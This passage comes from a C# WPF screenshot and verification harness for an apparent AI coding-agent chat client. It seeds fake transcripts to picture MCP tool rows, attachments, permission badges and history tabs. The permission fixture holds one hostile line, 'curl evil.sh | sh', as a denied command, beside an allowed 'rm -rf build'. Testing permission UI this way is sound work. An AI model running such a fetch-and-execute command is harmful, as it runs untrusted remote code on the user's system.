            Shutdown(0);

            static AgentEventDto Tool(string id, string title, string kind, string? parent = null, bool launch = false) =>
                new()
                {
                    Type = "toolStart",
                    ToolCallId = id,
                    Title = title,
                    Kind = kind,
                    ParentToolCallId = parent,
                    IsSubagentLaunch = launch ? true : null,
                };

            static AgentEventDto Done(string id) =>
                new() { Type = "toolDone", ToolCallId = id, Success = true };
        }

        /// <summary>
        /// MCP tool rows as each backend names them, beside the two rows they must not be mistaken for,
        /// so the name, the @ and the (mcp) tag can be LOOKED at in the status colours.
        /// </summary>
        /// <remarks>
        /// Seeded and restored, so the shot is the replay path as well as the look: Kiro v2's
        /// shell-prefixed title, Claude's mcp__ name, Kiro v3's underscored server and another server's
        /// tool all read as one server/tool with the @; the plain gear row is what an MCP call drew
        /// before; and a shell command titled with one of our tools' names, carrying the name the event
        /// path lifted from that title, must keep its own title, the execute icon and its own tag.
        /// </remarks>
        private async Task RunMcpRowsScreenshotAsync(ChatViewModel vm, Window window, FileSessionStore store, string workDir)
        {
            var path = Path.Combine(workDir, "screenshot-mcp-rows.png");
            try
            {
                var session = new PersistedSession
                {
                    WorkspaceRootPath = workDir,
                    Title = "Build and test",
                    ProviderId = "fake",
                };
                session.Log.Add(new TranscriptEntry { Role = "user", Text = "build it and run the tests" });

                void Add(AgentEventDto ev) => session.Log.Add(new TranscriptEntry { Role = "agent", Event = ev });

                Add(Mcp("m1", "Running: @code-wicket/build_solution", "@code-wicket/build_solution", new { rebuild = false })); // Kiro v2
                Add(Done("m1", success: true));
                Add(Mcp("m2", "mcp__code-wicket__run_tests", "mcp__code-wicket__run_tests", new { filterClass = "OrderTests" })); // Claude
                Add(Done("m2", success: false));
                Add(Mcp("m3", "@code_wicket/get_diagnostics", "@code_wicket/get_diagnostics", new { scope = "compiler" })); // Kiro v3
                Add(Done("m3", success: true));
                Add(Mcp("m4", "@atlassian-mcp/create_issue_smart", "@atlassian-mcp/create_issue_smart", new { summary = "Add audit columns" })); // still running

                // What an MCP call drew before: the fallback gear and "(other)".
                Add(new AgentEventDto { Type = "toolStart", ToolCallId = "o1", Title = "Tool", Kind = "other" });
                Add(Done("o1", success: true));

                // A shell command wearing our tool's name. Keeps its title, the execute icon and its tag.
                Add(new AgentEventDto
                {
                    Type = "toolStart", ToolCallId = "c1", Title = "Running: @code-wicket/get_diagnostics",
                    Kind = "execute", ToolName = "@code-wicket/get_diagnostics",
                    RawInputJson = System.Text.Json.JsonSerializer.Serialize(new { command = "@code-wicket/get_diagnostics" }),
                });
                Add(Done("c1", success: false));
                store.Save(session);

                await vm.InitializeAsync().ConfigureAwait(true);
                vm.RestoreMostRecentSession();

                // The Claude row opened, so its detail shows the backend's own spelling first.
                foreach (var row in vm.Items.OfType<ToolItemViewModel>())
                    row.IsExpanded = row.ToolCallId == "m2";

                await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                window.UpdateLayout();
                CaptureToPng(window, path);
            }
            catch (Exception ex)
            {
                File.WriteAllText(Path.Combine(workDir, "screenshot-mcp-rows-error.txt"), ex.ToString());
            }

            Shutdown(0);

            static AgentEventDto Mcp(string id, string title, string toolName, object args) =>
                new()
                {
                    Type = "toolStart",
                    ToolCallId = id,
                    Title = title,
                    Kind = "other",
                    ToolName = toolName,
                    RawInputJson = System.Text.Json.JsonSerializer.Serialize(args),
                };

            static AgentEventDto Done(string id, bool success) =>
                new() { Type = "toolDone", ToolCallId = id, Success = success };
        }

        private async Task RunAttachmentScreenshotAsync(ChatViewModel vm, Window window, FileSessionStore store, string workDir)
        {
            var path = Path.Combine(workDir, "screenshot-attachment.png");
            try
            {
                // Seeded and RESTORED rather than driven through a live turn. Not just convenience: the
                // restored path is the one that decodes a thumbnail from the saved FILE rather than from
                // bytes still in memory, so it is the only way to see that half at all — and the fake's
                // scripted turn is long enough to push the bubble off the top of the frame, which the
                // transcript rightly refuses to be scrolled back from while it is following (issue #90).
                var saved = AttachmentStore.Save("shot", "image/png", EncodePng(480, 300));

                var session = new PersistedSession
                {
                    WorkspaceRootPath = workDir,
                    Title = "Why is the button cut off?",
                    ProviderId = "fake",
                };
                session.Log.Add(new TranscriptEntry
                {
                    Role = "user",
                    Text = "why is the button cut off here?",
                    Attachments = saved is null
                        ? null
                        : new List<AttachmentEntry>
                        {
                            // StoredForm, not the path Save returned: a fixture that records the shape
                            // production no longer writes exercises the legacy branch and reports the
                            // new one green (issue #118's clipboard lesson, one layer over).
                            new AttachmentEntry
                            {
                                Name = "dialog-bug.png",
                                MimeType = "image/png",
                                Path = AttachmentStore.StoredForm(saved),
                            },
                        },
                });
                session.Log.Add(new TranscriptEntry
                {
                    Role = "agent",
                    Event = new AgentEventDto
                    {
                        Type = "text",
                        Text = "The panel's fixed height clips it — the button sits below the 240px bound.",
                    },
                });
                session.Log.Add(new TranscriptEntry { Role = "agent", Event = new AgentEventDto { Type = "turnDone" } });
                store.Save(session);

                await vm.InitializeAsync().ConfigureAwait(true);
                vm.RestoreMostRecentSession();

                // And one still in the composer, which is the other template — portrait, so the
                // thumbnail's aspect handling shows against the landscape one above it.
                vm.AttachImage("second-capture.png", "image/png", EncodePng(300, 400));
                vm.InputText = "and this one too";

                await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                window.UpdateLayout();
                CaptureToPng(window, path);
            }
            catch (Exception ex)
            {
                File.WriteAllText(Path.Combine(workDir, "screenshot-error.txt"), ex.ToString());
            }

            Shutdown(0);
        }

        /// <summary>
        /// Every permission state on one screen, rendered. This exists because the marks are CHARACTERS,
        /// and no assertion can tell a glyph from a fallback box: U+26A1 and friends have emoji variants
        /// that drop out of Segoe UI into the colour emoji font, and a badge that renders as tofu is worse
        /// than no badge at all. Seeded and RESTORED rather than driven live, for the same reason the
        /// attachment shot is: these are settled rows, and only a completed call has a permission state.
        /// </summary>
        private async Task RunPermissionScreenshotAsync(ChatViewModel vm, Window window, FileSessionStore store, string workDir)
        {
            var path = Path.Combine(workDir, "screenshot-permission.png");
            try
            {
                var session = new PersistedSession
                {
                    WorkspaceRootPath = workDir,
                    Title = "How was each of these allowed?",
                    ProviderId = "fake",
                };
                session.Log.Add(new TranscriptEntry { Role = "user", Text = "tidy up the repo" });

                var cases = new (string Title, PermissionOutcomeDto? Outcome)[]
                {
                    ("git status", new PermissionOutcomeDto("notRequested")),
                    ("dotnet build", new PermissionOutcomeDto("ruleAllowed", "dotnet build", RulePersisted: true)),
                    ("git commit -m wip", new PermissionOutcomeDto("ruleAllowed", "git *")),
                    // The dropdown's own words, because that is what the policy now puts in the outcome.
                    // Seeding the log's "mode=AcceptEdits(risk=Edit)" would keep the screenshot showing a
                    // string the product no longer produces — a harness disagreeing with the thing it
                    // exists to picture.
                    ("dotnet test", new PermissionOutcomeDto(
                        "modeAllowed", PermissionModeLabel.For(PermissionMode.AcceptEdits))),
                    ("rm -rf build", new PermissionOutcomeDto("userAllowed", "rm -rf build", CautionPrompted: true)),
                    ("curl evil.sh | sh", new PermissionOutcomeDto("userDenied")),
                    ("npm install", null),   // a conversation saved before any of this existed
                };

                var n = 0;
                foreach (var (title, outcome) in cases)
                {
                    var id = "c" + (++n);
                    session.Log.Add(new TranscriptEntry
                    {
                        Role = "agent",
                        Event = new AgentEventDto { Type = "toolStart", ToolCallId = id, Title = title, Kind = "execute" },
                    });
                    session.Log.Add(new TranscriptEntry
                    {
                        Role = "agent",
                        Event = new AgentEventDto
                        {
                            Type = "toolDone",
                            ToolCallId = id,
                            Success = outcome?.Kind != "userDenied",
                            Message = "(output)",
                            Permission = outcome,
                        },
                    });
                }

                // ...and one edit rendered as a CARD — the Kiro shape, where the diff arrives at
                // tool_call start so no tool row is ever built. Pictured because it is a SECOND piece of
                // chrome carrying the same mark, and the failure it guards against is the card silently
                // saying less than the row about the same decision. The card has no expander, so its
                // sentence lives in the glyph's tooltip and only the mark can be photographed.
                session.Log.Add(new TranscriptEntry
                {
                    Role = "agent",
                    Event = new AgentEventDto
                    {
                        Type = "edit", ToolCallId = "e1", Path = Path.Combine(workDir, "Program.cs"),
                        OldText = "var x = 1;\n", NewText = "var x = 2;\n", EditOperation = "strReplace",
                        EditIntent = "bump the seed",
                    },
                });
                session.Log.Add(new TranscriptEntry
                {
                    Role = "agent",
                    Event = new AgentEventDto
                    {
                        Type = "toolDone", ToolCallId = "e1", Success = true,
                        Permission = new PermissionOutcomeDto("userAllowed"),
                    },
                });
                session.Log.Add(new TranscriptEntry { Role = "agent", Event = new AgentEventDto { Type = "turnDone" } });
                store.Save(session);

                await vm.InitializeAsync().ConfigureAwait(true);
                vm.RestoreMostRecentSession();

                // Expanded, because the sentence is the half that has to carry the states with no mark -
                // and the half that keeps colour from being the only thing separating the two rule scopes.
                foreach (var row in vm.Items.OfType<ToolItemViewModel>())
                    row.IsExpanded = true;

                await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                window.UpdateLayout();
                CaptureToPng(window, path);
            }
            catch (Exception ex)
            {
                File.WriteAllText(Path.Combine(workDir, "screenshot-error.txt"), ex.ToString());
            }

            Shutdown(0);
        }

        private async Task RunHeldScreenshotAsync(ChatViewModel vm, Window window, string workDir)
        {
            var path = Path.Combine(workDir, "screenshot-held.png");
            try
            {
                await vm.InitializeAsync().ConfigureAwait(true);

                vm.InputText = "[slow-tool] run the tests";
                vm.SendCommand.Execute(null);

                // Wait for the agent to be genuinely inside the call: the tray's status line names what
                // it is waiting for, so a shot taken before the call opens would show the wrong text.
                await WaitForTranscriptAsync(
                    () => vm.Items.OfType<ToolItemViewModel>().Any(t => t.Status == ToolStatus.Running),
                    TimeSpan.FromSeconds(20)).ConfigureAwait(true);

                vm.InputText = "also update the changelog";
                vm.SendCommand.Execute(null);
                vm.InputText = "and check the docs still build";
                vm.SendCommand.Execute(null);
                // The release point is one setting for the tray now, shown beside the status line —
                // flip it so the shot carries the Queue label rather than only the default.
                vm.TogglePendingReleaseCommand.Execute(null);
                vm.TogglePendingReleaseCommand.Execute(null);

                vm.InputText = "typing the next one…";

                await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                window.UpdateLayout();
                CaptureToPng(window, path);

                // Second artifact: the release-point menu, open. Its theming is asserted in --smoke, but
                // an assertion compares brush references and a menu is judged by looking at it — and the
                // defect being guarded (platform-light chrome in a dark pane) is purely visual. Rendered
                // from the ContextMenu itself, like the usage popup: a menu lives in its own hwnd, so the
                // window capture above cannot see it.
                if (FindDescendantByName(window, "PendingReleaseButton") is System.Windows.Controls.Button pill
                    && pill.ContextMenu is { } pillMenu)
                {
                    pill.RaiseEvent(new RoutedEventArgs(System.Windows.Controls.Primitives.ButtonBase.ClickEvent));
                    await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                    pillMenu.UpdateLayout();
                    CaptureElementToPng(pillMenu, Path.Combine(workDir, "screenshot-held-menu.png"));
                    pillMenu.IsOpen = false;
                }

                // Third artifact: a picker's DROP-DOWN, open. The closed control is in the ordinary
                // window shot, but the list is a Popup - its own visual tree - and that is the half
                // that stays WPF-light when a ComboBox is left unstyled. Judged by looking at it, for
                // the same reason the menu above is: an assertion here would compare brush references
                // while the defect is "this is white and the pane is not".
                if (window.Content is FrameworkElement pickerRoot
                    // The permission picker rather than the provider one: the fake offers a single
                    // backend, so that drop-down is one row and shows nothing about item padding or
                    // which row reads as selected. This one has four.
                    && pickerRoot.FindName("PermissionModePicker") is System.Windows.Controls.ComboBox picker)
                {
                    picker.IsDropDownOpen = true;
                    await System.Windows.Threading.Dispatcher.Yield(
                        System.Windows.Threading.DispatcherPriority.Background);
                    window.UpdateLayout();

                    // The POPUP's child, not the ComboBox. Rendering the control itself draws only the
                    // closed box: a Popup is hosted in its own window, so it is not in the visual tree
                    // being captured, and a render of the control is a picture of exactly what the
                    // ordinary window shot already shows.
                    if (picker.Template?.FindName("PART_Popup", picker)
                            is System.Windows.Controls.Primitives.Popup popup
                        && popup.Child is FrameworkElement list)
                    {
                        list.UpdateLayout();
                        CaptureElementToPng(list, Path.Combine(workDir, "screenshot-held-picker.png"));
                    }

                    picker.IsDropDownOpen = false;
                }
            }
            catch (Exception ex)
            {
                File.WriteAllText(Path.Combine(workDir, "screenshot-held-error.txt"), ex.ToString());
            }

            Shutdown(0);
        }

        /// <summary>
        /// Layout, drain the dispatcher, layout again. The transcript's follow-the-bottom scroll defers
        /// a second pass to Loaded priority (a virtualising panel's extent is an estimate until the
        /// items it scrolled past are realised), so a single UpdateLayout samples a position that is
        /// still settling.
        /// </summary>
        /// <summary>
        /// The history picker's two tabs — that they are two, that exactly one pane is drawn, and that
        /// the pill you clicked is the one lit.
        /// </summary>
        /// <remarks>
        /// <para><b>Why the mechanism and not just the view-model.</b> Which tab is selected is a
        /// view-model fact and is unit-tested; what is DRAWN is four XAML bindings — a Visibility per
        /// pane and a OneWay IsChecked per pill. Remove any of them and the build is clean and every
        /// test still passes, while the popup either stacks both lists (the layout this feature exists
        /// to undo) or shows a strip with neither pill lit.</para>
        /// <para><b>Driven through <c>ButtonBase.OnClick</c>, and neither cheaper route works.</b>
        /// Raising <c>ClickEvent</c> does not run a bound Command — that happens inside
        /// <c>OnClick</c>, which only real input reaches. The automation peer looks like the way round
        /// it and is not: <c>IToggleProvider.Toggle</c> calls <c>ToggleButton.OnToggle</c>, which sets
        /// IsChecked and stops there, so the command never runs (measured — the pill lit and the pane
        /// did not change). Setting IsChecked and executing the Command by hand instead would be the
        /// harness supplying the very thing under test. <c>OnClick</c> is the one entry point a mouse
        /// goes through and it does both halves in the order it does them, which is what makes the
        /// re-click below mean anything; a rename would leave <c>clickable=False</c> in the detail
        /// rather than a check that quietly asserts nothing.</para>
        /// <para>The re-click is the point of the third step. Clicking the pill already selected drives
        /// its IsChecked to false before the command runs, and the binding is OneWay, so unless the
        /// view-model notifies on a set that changed nothing the pill stays dark with both panes'
        /// bindings unread. That failure is invisible to every assertion about the selected tab.</para>
        /// </remarks>
        private static async Task<(bool Ok, string Detail)> VerifyHistoryTabsAsync(
            ChatViewModel vm, Window window, CodeWicket.UI.Views.ChatView chat)
        {
            if (chat.FindName("SavedSessionsPane") is not FrameworkElement savedPane
                || chat.FindName("BackendSessionsPane") is not FrameworkElement backendPane
                || chat.FindName("SavedSessionsTab") is not System.Windows.Controls.Primitives.ToggleButton savedTab
                || chat.FindName("BackendSessionsTab") is not System.Windows.Controls.Primitives.ToggleButton backendTab)
            {
                return (false, "panes or pills not found");
            }

            // The strip only exists while there is a second tab to be on, so the listing has to have
            // answered before any of this means anything. The popup's own listing is fire-and-forget and
            // one can still be out from an earlier phase, which returns at the in-flight guard having
            // listed nothing.
            for (var i = 0; i < 20 && !vm.HasCliSection; i++)
            {
                await vm.RefreshBackendSessionsAsync().ConfigureAwait(true);
                if (!vm.HasCliSection)
                    await Task.Delay(50).ConfigureAwait(true);
            }

            vm.IsHistoryOpen = true;
            await SettleAsync(window).ConfigureAwait(true);

            try
            {
                var strip = savedTab.IsVisible && backendTab.IsVisible;
                if (!strip)
                    return (false, $"strip not drawn (cliSection={vm.HasCliSection})");

                var landedOnSaved = savedPane.Visibility == Visibility.Visible
                    && backendPane.Visibility == Visibility.Collapsed
                    && savedTab.IsChecked == true && backendTab.IsChecked == false;

                // Virtualization, asserted on the MECHANISM rather than on a row count.
                //
                // A row count cannot see the failure this guards: the fake store holds three
                // conversations, which fit a viewport and would all be realised whether the list
                // virtualizes or not - so "realised < total" passes by having too few rows, which is
                // the shape of check this repo keeps having to un-write.
                //
                // The half that silently fails is the VIEWPORT. Each pane used to be a ScrollViewer
                // over a StackPanel, and a StackPanel measures its child at infinite height: configure
                // virtualization under one and every setter is honoured, the panel is the right type,
                // and nothing virtualizes because there is no viewport to virtualize against. So this
                // asks the realised panel whether it is the scrolling owner and has a finite extent to
                // scroll within - the one question the trap answers differently.
                var virtualised = "no VirtualizingStackPanel realised under the saved list";
                var viewport = double.NaN;
                var realisedRows = 0;
                if (FindDescendantOfType<System.Windows.Controls.VirtualizingStackPanel>(savedPane) is { } panel)
                {
                    var isVirtualizing = System.Windows.Controls.VirtualizingPanel.GetIsVirtualizing(panel);
                    viewport = panel.ViewportHeight;
                    realisedRows = panel.Children.Count;
                    var scrolling = isVirtualizing
                        && panel.ViewportHeight > 0
                        && !double.IsInfinity(panel.ViewportHeight);
                    virtualised = scrolling
                        ? string.Empty
                        : $"list has no viewport (isVirtualizing={isVirtualizing}, "
                          + $"viewport={panel.ViewportHeight:F0}) - it will realise every row";
                }

                if (virtualised.Length > 0)
                    return (false, virtualised);

                // What the COLLAPSED pane costs. The backend list is populated well before the user
                // ever picks its tab, so if a hidden pane still realised its rows we would be paying
                // for a list nobody has asked to see - on every open.
                //
                // Reported as a pair with the row count on purpose: "0 realised" is trivially true of
                // a pane with nothing in it, so the figure only means anything beside the number of
                // rows it declined to draw.
                var hiddenRows = vm.BackendSessions.Count;
                var hiddenPanel = FindDescendantOfType<System.Windows.Controls.VirtualizingStackPanel>(backendPane);
                var hiddenRealised = hiddenPanel?.Children.Count ?? 0;

                var clickable = Click(backendTab);
                await SettleAsync(window).ConfigureAwait(true);

                var swapped = backendPane.Visibility == Visibility.Visible
                    && savedPane.Visibility == Visibility.Collapsed
                    && backendTab.IsChecked == true && savedTab.IsChecked == false;

                Click(backendTab);
                await SettleAsync(window).ConfigureAwait(true);

                var stuck = backendTab.IsChecked == true
                    && backendPane.Visibility == Visibility.Visible;

                // The hidden-conversations line, on the pane it belongs to. The filter itself is a pure
                // function with its own tests; what only the tree can show is that the offer is drawn,
                // that clicking it puts the rows back, and that it then goes away - a line that stayed
                // would keep offering rows there are no longer any of.
                var hiddenBefore = vm.UnusedBackendSessionCount;
                var shownBefore = vm.BackendSessions.Count;
                // Named off the ChatView, not walked from the window: a Popup's child is its own
                // top-level visual tree, so a descendant walk from the window finds nothing there.
                var offer = chat.FindName("ShowUnusedSessions") as System.Windows.Controls.Button;
                var offered = hiddenBefore > 0 && offer is not null && offer.IsVisible;

                // Whether it is WIRED is a second fact, and it has to be read as one. A Command bound to
                // a property that exists nowhere resolves to null with only a trace message — the defect
                // class the header-menu phase exists to catch, and how "Continue in a terminal…" shipped
                // visible and inert. Dereferenced unguarded, that break reported "FAIL (exception):
                // NullReferenceException" instead of naming the button that is drawn but does nothing
                // (#247).
                var offerCommand = offered ? offer!.Command : null;
                var wired = offerCommand is not null;

                var restored = false;
                if (wired)
                {
                    // Through the Command, which is how a Button executes: raising Click does not reach
                    // it. The pill above needs OnClick because a ToggleButton's own IsChecked is half
                    // of what is under test there; here there is no such half.
                    offerCommand!.Execute(offer!.CommandParameter);
                    await SettleAsync(window).ConfigureAwait(true);

                    restored = vm.BackendSessions.Count == shownBefore + hiddenBefore
                        && vm.UnusedBackendSessionCount == 0
                        && !offer!.IsVisible;
                }

                return (landedOnSaved && clickable && swapped && stuck && offered && wired && restored,
                    $"viewport={viewport:F0} realisedRows={realisedRows} of {vm.History.Count} "
                    + $"hiddenPaneRealised={hiddenRealised} of {hiddenRows} "
                    + $"landedOnSaved={landedOnSaved} clickable={clickable} swapped={swapped} "
                    + $"stuckOnReclick={stuck} badge={vm.BackendTabBadge ?? "none"} "
                    + $"hiddenOffered={offered} ({hiddenBefore} of {shownBefore + hiddenBefore}) "
                    + $"hiddenOfferWired={wired} restored={restored}");
            }
            finally
            {
                // Left as it was found: the tab back on Saved, the unused rows hidden again, and the
                // popup closed. An open Popup is its own top-level window and would sit over everything
                // the run does next. This is the last phase today, which is exactly why the restore is
                // written properly rather than skipped - the next one added after it inherits whatever
                // this leaves.
                vm.HistoryTab = CodeWicket.UI.ViewModels.HistoryTab.Saved;
                vm.ShowUnusedBackendSessions = false;
                vm.IsHistoryOpen = false;
                await SettleAsync(window).ConfigureAwait(true);
            }

            // Virtual, so this dispatches to ToggleButton.OnClick: OnToggle (the pill's own IsChecked)
            // then ButtonBase.OnClick (the Click event and the bound Command), which is the order and
            // the pair that a mouse produces.
            static bool Click(System.Windows.Controls.Primitives.ToggleButton button)
            {
                var onClick = typeof(System.Windows.Controls.Primitives.ButtonBase).GetMethod(
                    "OnClick",
                    System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic,
                    binder: null, types: Type.EmptyTypes, modifiers: null);
                if (onClick is null)
                    return false;

                onClick.Invoke(button, null);
                return true;
            }
        }

        /// <summary>
        /// A backend notice reaches the transcript, is drawn from the backend's OWN level, and an
        /// unrecognised level is shown rather than dropped (issues #208, #85).
        /// </summary>
        /// <remarks>
        /// <para><b>Scoped to notices added by this phase</b>, by taking the count first. The pane is
        /// full of notices by now - workspace changes, warm-start failures, the copy-to-clipboard line
        /// - so an assertion over every NoticeItemViewModel would pass on somebody else's.</para>
        /// <para><b>The unknown-level case is the one that matters.</b> "warning" and an errorType are
        /// both handled today; a level nobody has seen is the shape a future backend sends, and the
        /// failure mode is silent - a switch with no default drops the notice and the transcript looks
        /// exactly as it does when the backend said nothing.</para>
        /// </remarks>
        private static async Task<(bool Ok, string Detail)> VerifyBackendNoticesAsync(ChatViewModel vm)
        {
            var before = vm.Items.OfType<NoticeItemViewModel>().Count();

            vm.InputText = "[notices] show me what the backend can say";
            vm.SendCommand.Execute(null);

            await WaitForTranscriptAsync(
                () => vm.Items.OfType<NoticeItemViewModel>().Count() >= before + 5,
                TimeSpan.FromSeconds(20)).ConfigureAwait(true);

            var added = vm.Items.OfType<NoticeItemViewModel>().Skip(before).ToList();
            if (added.Count < 5)
                return (false, $"only {added.Count} of 5 notices reached the transcript");

            var compaction = added.FirstOrDefault(n => n.Text.Contains("condensed", StringComparison.Ordinal));
            var rateLimit = added.FirstOrDefault(n => n.Text.Contains("rate limiting", StringComparison.Ordinal));
            var limit = added.FirstOrDefault(n => n.Text.Contains("monthly usage limit", StringComparison.Ordinal));
            var unknown = added.FirstOrDefault(n => n.Text.Contains("never seen before", StringComparison.Ordinal));
            var withDetail = added.FirstOrDefault(n => n.Details is { Length: > 0 });

            // Housekeeping and a delay are informational; a refusal is an error. Nothing is gated on
            // the level - this is only how it is DRAWN.
            var levelled = compaction is { Kind: NoticeKind.Info }
                && rateLimit is { Kind: NoticeKind.Info }
                && limit is { Kind: NoticeKind.Error };

            var unknownShown = unknown is { Kind: NoticeKind.Info };

            // The reply is one message either side of the notice, not two. A compaction lands mid-turn
            // and the turn carries on, so a notice that closed the streaming bubble would split it.
            var reply = vm.Items.OfType<MessageItemViewModel>()
                .LastOrDefault(m => m.Role == MessageRole.Assistant);
            var unsplit = reply is not null
                && reply.Text.Contains("Working on it", StringComparison.Ordinal)
                && reply.Text.Contains("rest of the reply", StringComparison.Ordinal);

            var ok = levelled && unknownShown && withDetail is not null && unsplit;
            return (ok,
                $"added={added.Count} levelled={levelled} unknownShown={unknownShown} "
                + $"detail={(withDetail is not null)} unsplitReply={unsplit} "
                + $"kinds=[{string.Join(",", added.Select(n => n.Kind.ToString()))}]");
        }

        private static async Task SettleAsync(Window window)
        {
            window.UpdateLayout();
            await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
            window.UpdateLayout();
        }

        // --name value (first occurrence); null when absent or value-less.
        private static string? OptionValue(string[] args, string name)
        {
            var i = Array.IndexOf(args, name);
            return i >= 0 && i + 1 < args.Length ? args[i + 1] : null;
        }

        // All values of a repeatable --name value option (e.g. --allow "git *" --allow "npm *").
        private static string[] OptionValues(string[] args, string name)
        {
            var values = new System.Collections.Generic.List<string>();
            for (var i = 0; i < args.Length - 1; i++)
                if (args[i] == name)
                    values.Add(args[i + 1]);
            return values.ToArray();
        }

        /// <summary>Drives one prompt, then renders the window to a PNG and exits.</summary>
        private async Task RunScreenshotAsync(ChatViewModel vm, Window window, string workDir)
        {
            var path = Path.Combine(workDir, "screenshot.png");
            try
            {
                // Two short user bubbles above the sent one, added straight to the transcript (one fake
                // turn is all the shot needs). They must each shrink-wrap to their own text and end with
                // their full stop intact: rendered the same width as each other means the bubble is
                // sitting at its MaxWidth instead of hugging (SelectableEmojiText's measurer), and a
                // missing trailing character or a last word pushed onto line two means its box lost the
                // slack the RichTextBox needs.
                vm.Items.Add(new MessageItemViewModel(MessageRole.User, "A short prompt."));
                vm.Items.Add(new MessageItemViewModel(MessageRole.User, "A slightly longer prompt that should still fit on one line."));

                // Emoji in the prompt: the user bubble (SelectableEmojiText) must render it in colour.
                // Long enough to wrap, so the shot also shows the bubble's width rule (a fraction of
                // the transcript, clamped) against the full-width assistant text beside it — a bubble
                // running edge-to-edge means the MaxWidth binding silently failed to resolve.
                vm.InputText = "Say hello 👋 🎉 and write a file — and keep this prompt long enough "
                    + "that the user bubble has to wrap onto several lines.";
                vm.SendCommand.Execute(null);
                // Capture with the permission banner visible (don't auto-allow): wait until it shows,
                // falling back to idle so the shot is still taken if no prompt appears.
                await WaitForPermissionOrIdleAsync(vm, TimeSpan.FromSeconds(30)).ConfigureAwait(true);
                // For a command banner, click "always" to reveal the editable-scope step so the shot
                // exercises the new UI (the plain option buttons are already covered elsewhere).
                if (vm.PendingPermission is { IsCommand: true } banner)
                {
                    banner.Options.FirstOrDefault(o =>
                        string.Equals(o.Kind, "AllowAlways", StringComparison.OrdinalIgnoreCase))?.Command.Execute(null);
                    await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                }

                // Zoom readout: triggered just before the capture so the artifact actually shows the pill
                // (it fades after ~1.5s, so this has to be the last thing before rendering). Driven through
                // the internal seam because Keyboard.Modifiers reads the physical keyboard.
                if (window.Content is CodeWicket.UI.Views.ChatView zoomView)
                {
                    zoomView.ApplyZoomShortcut(CodeWicket.UI.Views.ChatView.ZoomShortcut.In);
                    await Task.Delay(250).ConfigureAwait(true); // past the 80ms fade-in, inside the hold
                }

                await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                window.UpdateLayout();
                CaptureToPng(window, path);

                // Second artifact: the transcript items panel at its FULL laid-out height (the live
                // window auto-scrolls to the newest item, so earlier content — e.g. the markdown/
                // emoji demo — is outside the viewport in the window shot). Rendering the panel
                // visual directly captures everything, same pattern as the popup captures.
                //
                // Virtualisation would defeat that: off-screen items have no visual, so the capture
                // would show only the viewport — the exact content this artifact exists to reveal.
                //
                // BOTH switches have to come off, which is easy to get wrong: clearing IsVirtualizing
                // alone still yields a viewport-sized shot, because CanContentScroll=True makes the
                // panel the IScrollInfo and it then measures itself to the viewport whether or not it
                // is virtualising. Turning off content scrolling too makes it size to its content.
                // This is a DEBUG ARTIFACT ONLY; never do either on the live path — restoring the pair
                // is what puts back the cost the virtualisation removed.
                if (FindDescendantByName(window, "TranscriptItems") is System.Windows.Controls.ItemsControl transcript)
                {
                    var scroller = FindDescendantOfType<System.Windows.Controls.ScrollViewer>(transcript, _ => true);
                    var wasVirtualizing = System.Windows.Controls.VirtualizingStackPanel.GetIsVirtualizing(transcript);
                    var wasContentScroll = scroller?.CanContentScroll ?? true;

                    System.Windows.Controls.VirtualizingStackPanel.SetIsVirtualizing(transcript, false);
                    if (scroller is not null)
                        scroller.CanContentScroll = false;
                    transcript.UpdateLayout();

                    if (FindDescendantOfType<System.Windows.Controls.Panel>(transcript, p => p.ActualHeight > 0)
                        is { } panel)
                    {
                        CaptureVisualToPng(panel,
                            (int)System.Math.Ceiling(panel.ActualWidth),
                            (int)System.Math.Ceiling(panel.ActualHeight),
                            Path.Combine(workDir, "screenshot-transcript.png"));
                    }

                    System.Windows.Controls.VirtualizingStackPanel.SetIsVirtualizing(transcript, wasVirtualizing);
                    if (scroller is not null)
                        scroller.CanContentScroll = wasContentScroll;
                    transcript.UpdateLayout();
                }

                // Third artifact: the status strip carrying usage. The main shot is deliberately taken
                // mid-turn with the permission banner up, and consumption is only reported as the turn
                // ends — so the ring is legitimately absent there. Answer the prompt, let the turn
                // finish, and capture the strip on its own.
                // Auto-allow every prompt, not just the one on screen: the turn blocks on each in turn,
                // and consumption is only reported once it runs to completion.
                void AllowAll(object? s, System.ComponentModel.PropertyChangedEventArgs e)
                {
                    if (e.PropertyName == nameof(ChatViewModel.PendingPermission) && vm.PendingPermission is { } prompt)
                        (prompt.Options.FirstOrDefault(o => o.IsAllow) ?? prompt.Options.FirstOrDefault())?.Command.Execute(null);
                }
                vm.PropertyChanged += AllowAll;
                (vm.PendingPermission?.Options.FirstOrDefault(o => o.IsAllow))?.Command.Execute(null);
                await WaitForTranscriptAsync(() => vm.HasUsage, TimeSpan.FromSeconds(20)).ConfigureAwait(true);
                vm.PropertyChanged -= AllowAll;
                window.UpdateLayout();
                if (FindDescendantByName(window, "StatusStrip") is System.Windows.FrameworkElement strip)
                    CaptureElementToPng(strip, Path.Combine(workDir, "screenshot-status.png"));

                // Fourth artifact: the usage panel, opened. A Popup renders in its own hwnd, so the
                // window capture can't reach it — render its Child directly, the same way the history
                // picker is captured.
                vm.IsUsageOpen = true;
                await System.Windows.Threading.Dispatcher.Yield(System.Windows.Threading.DispatcherPriority.Background);
                if (FindDescendantByName(window, "UsagePopup") is System.Windows.Controls.Primitives.Popup usagePopup
                    && usagePopup.Child is System.Windows.FrameworkElement usagePanel)
                {
                    usagePanel.UpdateLayout();
                    CaptureElementToPng(usagePanel, Path.Combine(workDir, "screenshot-usage.png"));
                }
                vm.IsUsageOpen = false;

                // Fifth artifact: the MCP roster panel (issue #122), same reason as the usage panel.
                // Two things here can ONLY be checked by looking. The panel's own legibility, and — in
                // screenshot-status.png above — that the resting affordance is a plain subtle glyph
                // making no health claim. No assertion can tell a neutral icon from a green tick, which
                // is the same reason --screenshot-permission exists for its glyphs.
                vm.IsMcpOpen = true;

